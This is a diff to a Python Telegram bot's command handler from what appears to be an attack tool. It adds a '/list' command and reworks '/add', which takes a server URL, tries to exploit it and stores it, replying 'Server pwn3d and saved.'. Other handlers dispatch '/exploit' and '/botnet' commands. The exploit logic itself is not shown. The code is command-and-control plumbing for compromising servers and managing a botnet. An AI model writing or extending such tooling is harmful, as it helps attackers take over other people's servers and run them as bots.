@@ -16,16 +16,23 @@ class actions:
             self.exploit()
         elif msg.startswith('/botnet'):
             self.botnet()
+        elif msg.startswith('/list'):
+            self.list()
+
+    def list(self,):
+        response = self.xpl.list()
+        self.bot.sendMessage(self.chat_id,response)
 
     def add(self,):
             splited = self.msg.split(' ',1)
             if len(splited) < 2:
                 self.bot.sendMessage(self.chat_id,'There is something wrong pay attention!!')
             else:
-                url = splited[1]
-                print url
+                url = splited[1].strip()
                 response = self.xpl.add(url)
-                if response:
+                if response == 'InDB':
+                    self.bot.sendMessage(self.chat_id,'Server already in DB.')
+                elif response is True:
                     self.bot.sendMessage(self.chat_id,'Server pwn3d and saved.')
                 else:
                     self.bot.sendMessage(self.chat_id,'Sorry, i can not exploit it')
@@ -47,6 +54,7 @@ class actions:
                 self.bot.sendMessage(self.chat_id,'Bro there is something going wrong, sorry :/')
         else:
             self.bot.sendMessage(self.chat_id,'There is something wrong pay attention!')
+
     def botnet(self,):
         splited = self.msg.split(' ',1)
         if len(splited) < 2:
